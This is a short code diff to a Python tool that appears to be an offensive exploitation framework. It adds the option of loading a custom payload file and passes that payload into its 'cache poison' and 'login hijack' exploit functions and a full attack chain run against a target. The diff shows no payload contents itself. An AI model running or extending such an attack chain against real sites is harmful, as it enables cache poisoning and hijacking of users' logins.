@@ -120,10 +120,20 @@ def main():
             print("[2] Login Hijack")
             exp = input("Choose exploit type: ").strip()
 
+            # Ask for payload file or use default
+            payload_path = input("Path to payload file (or press Enter for default): ").strip()
+            top_payload = None
+            if payload_path and os.path.exists(payload_path):
+                with open(payload_path, 'r') as f:
+                    top_payload = f.read()
+                print(f"[*] Using payload from: {payload_path}")
+            else:
+                print("[*] Using default payload")
+
             if exp == "1":
-                cache_poison(target)
+                cache_poison(target, top_payload)
             elif exp == "2":
-                login_inject(target)
+                login_inject(target, top_payload)
             else:
                 print("Invalid exploit type.\n")
 
@@ -148,8 +158,13 @@ def main():
             execute_payload(target, payload_path)
 
             print("[*] Step 4: Attempting exploitation chain ...\n")
-            cache_poison(target)
-            login_inject(target)
+            
+            # Read the generated payload for exploitation
+            with open(payload_path, 'r') as f:
+                top_payload = f.read()
+            
+            cache_poison(target, top_payload)
+            login_inject(target, top_payload)
 
             print("[✓] Full chain completed.\n")
 
